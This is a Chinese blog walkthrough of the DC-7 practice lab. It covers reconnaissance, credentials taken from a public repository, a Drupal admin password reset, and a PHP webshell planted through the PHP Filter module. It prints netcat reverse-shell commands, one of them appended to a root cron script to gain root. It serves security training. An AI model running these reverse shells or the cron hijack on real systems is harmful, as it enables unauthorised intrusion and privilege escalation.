---
link: https://blog.csdn.net/2403_88102829/article/details/157507034
title: dc7打靶报告
description: 文章浏览阅读390次，点赞8次，收藏7次。开放端口：22(SSH)、80(HTTP)——cms是drupal 8，服务器是Apache。左下角有一个add content ，我们试试能不能写个马进去，发现文本格式没有php的。cat一下mbox发现几个root发的邮件，有一个定时任务。再回去artical编辑那里，发现文本形式可以选择php了。因为之前开放了22端口，直接用这组密码远程连接试试。执行该脚本时，就能获得一个root shell。ls发现有一个mbox，一个backups。看看存储库里的每个文件，方向对了。Drupal网站备份数据库。
keywords: android
author: Le_ee 博客等级 码龄1年
date: 2026-02-05T03:02:10.767Z
categories:
  - 靶场复现
tags:
  - DC靶场
  - Drupal
  - Linux
publisher: null
stats: paragraph=77 sentences=63, words=249
---

<meta name="referrer" content="no-referrer"/>
环境：

**攻击机ip**：Kali192.168.145.128

**靶机ip**：192.168.145.189

信息收集

`arp-scan -l`，发现存活靶机 192.168.145.189

![](https://i-blog.csdnimg.cn/direct/6e7cc805d8e14474995cdd441faaac71.png)

识别开放端口和操作系统

`nmap -A -p-&#xA0;192.168.145.189`

开放端口：22(SSH)、80(HTTP)——cms是drupal 8，服务器是Apache

操作系统：Linux

![](https://i-blog.csdnimg.cn/direct/029e0e194bc64afab1210ffba61a309c.png)

看一下web页面，提示这一关爆破和字典攻击都不一定有用

![](https://i-blog.csdnimg.cn/direct/ccb9b7a2f2484130888b617d7b63eaee.png)

![](https://i-blog.csdnimg.cn/direct/e15a3e0819154286ad27f2f7130dc531.png)

`dirsearch -u http://192.168.145.189 -i 200&#xFF0C;&#x6307;&#x5B9A;&#x72B6;&#x6001;&#x7801;200&#x626B;&#x5B50;url`

`&#x9010;&#x4E2A;&#x5C1D;&#x8BD5;&#x4E00;&#x4E0B;&#xFF0C;&#x53D1;&#x73B0;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x9875;&#x9762;&#x6709;&#x6709;&#x7528;&#x56DE;&#x663E;`

![](https://i-blog.csdnimg.cn/direct/74f6112e69da4ceba55169e743cc6e8d.png)

![](https://i-blog.csdnimg.cn/direct/a4ed271f91c04cc58d795c91218b20c6.png)

![](https://i-blog.csdnimg.cn/direct/9a196e7b875d4f9c8d84d1ef1b1a8414.png)

看到左下角有一个疑似靶场作者留下的标识

![](https://i-blog.csdnimg.cn/direct/8a0507b85e9741eeb5087c82c82bab2e.png)

搜一下

![](https://i-blog.csdnimg.cn/direct/6f717d0ddf5741fbaf80f426f454afa9.png)

![](https://i-blog.csdnimg.cn/direct/2992c25960ca4d53b93f53d70016e303.png)

看看存储库里的每个文件，方向对了

![](https://i-blog.csdnimg.cn/direct/44c2cdda5e9a4b41a648a52aa6fcfcc8.png)

找到一组用户名和密码

![](https://i-blog.csdnimg.cn/direct/82dbb327e9844dbeaa5789382353b68e.png)

因为之前开放了22端口，直接用这组密码远程连接试试

![](https://i-blog.csdnimg.cn/direct/333be2eb32d546f3838d274b3645ace3.png)

登录成功

sudo -l试了下用不了

![](https://i-blog.csdnimg.cn/direct/e535d7999e7f4c798951ee68451e9697.png)

ls发现有一个mbox，一个backups

backups里有两个加密文件

![](https://i-blog.csdnimg.cn/direct/7eb191d69fad49a4b36229cdada51391.png)

cat一下mbox发现几个root发的邮件，有一个定时任务

![](https://i-blog.csdnimg.cn/direct/38b0a720d0634b97b67379d7bab509fe.png)

大约是15分钟执行一次

Cron任务执行的 **脚本完整路径**： `/opt/scripts/backups.sh`

![](https://i-blog.csdnimg.cn/direct/10c0c25bb069440eb8f61a54b2edcce0.png)

目前为止，我们还有个网页没有登录进去

Drupal网站备份数据库 **最常用工具就是drush，** `drush` 可以 **直接重置Drupal用户密码**

```
drush user-password admin --password="newpass123"
```

登录成功

![](https://i-blog.csdnimg.cn/direct/d27bdc1d440e4b74a8bbe4bab95e7a18.png)

![](https://i-blog.csdnimg.cn/direct/ebfd9329a16749c4b90a0c6ab9a05da8.png)

左下角有一个add content ，我们试试能不能写个马进去，发现文本格式没有php的

在manage里找到了extend

![](https://i-blog.csdnimg.cn/direct/f594acacdaae4f588fea78c9c59af87e.png)

安装文本格式php的工具插件

![](https://i-blog.csdnimg.cn/direct/14c2a57e26ed4fba98684d491be5a4ac.png)

![](https://i-blog.csdnimg.cn/direct/64a3a715af7b48729d8d07cb5bd6c732.png)

![](https://i-blog.csdnimg.cn/direct/13504944c03d4b51a6578b73c0305751.png)

安装PHP Filter模块

![](https://i-blog.csdnimg.cn/direct/f7f8727f95d649b5bca713e75e1db8be.png)

再回去artical编辑那里，发现文本形式可以选择php了

![](https://i-blog.csdnimg.cn/direct/ee9e8fea07fb42128e4f4bb001d1d290.png)

写入一句话木马

![](https://i-blog.csdnimg.cn/direct/bee49018ff0143198ee0c3a404ffa0a8.png)

保存

![](https://i-blog.csdnimg.cn/direct/2f27e0c3269643bfaeb0e8ec33e95d7e.png)

蚁剑成功连接

![](https://i-blog.csdnimg.cn/direct/90ae96530b45414283fa08f1a0398762.png)

![](https://i-blog.csdnimg.cn/direct/3d7eaa7f02aa43f5a3ec9ccde3896d15.png)

**建立反弹shell**

`kali:nc -lvnp 1234`

`<strong>&#x865A;&#x62DF;&#x7EC8;&#x7AEF;&#xFF1A;</strong>nc -e /bin/bash 192.168.145.128 1234`

![](https://i-blog.csdnimg.cn/direct/470e28979cd74d1c934fd5f5d5194d60.png)

![](https://i-blog.csdnimg.cn/direct/eb810b4142c641119cd735ecb2983192.png)

然后我们将一段能建立 **反向Shell**的代码追加到 `/opt/scripts/backups.sh` 文件中，等cron以 **root权限**执行该脚本时，就能获得一个root shell

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.145.128 5555 >/tmp/f" >> /opt/scripts/backups.sh

```
rm /tmp/f;                    # &#x5220;&#x9664;&#x65E7;&#x7684;&#x7BA1;&#x9053;&#x6587;&#x4EF6;&#xFF08;&#x5982;&#x679C;&#x5B58;&#x5728;&#xFF09;
mkfifo /tmp/f;                # &#x521B;&#x5EFA;&#x547D;&#x540D;&#x7BA1;&#x9053;&#x6587;&#x4EF6; /tmp/f
cat /tmp/f |                  # &#x8BFB;&#x53D6;&#x7BA1;&#x9053;&#x5185;&#x5BB9;
/bin/sh -i 2>&1 |             # &#x542F;&#x52A8;&#x4EA4;&#x4E92;&#x5F0F;shell&#xFF0C;&#x5E76;&#x5C06;&#x9519;&#x8BEF;&#x8F93;&#x51FA;&#x91CD;&#x5B9A;&#x5411;&#x5230;&#x6807;&#x51C6;&#x8F93;&#x51FA;
nc 192.168.145.128 5555 > /tmp/f  # &#x8FDE;&#x63A5;&#x5230;&#x653B;&#x51FB;&#x8005;&#x673A;&#x5668;(192.168.145.128:5555)&#xFF0C;&#x5E76;&#x5C06;&#x63A5;&#x6536;&#x5230;&#x7684;&#x6570;&#x636E;&#x5199;&#x5165;&#x7BA1;&#x9053;
```

等待root执行定时任务

**kali监听**： `nc -lvnp 5555`

![](https://i-blog.csdnimg.cn/direct/6339c475b3f645db9ea6acde7411476e.png)

完结撒花！！
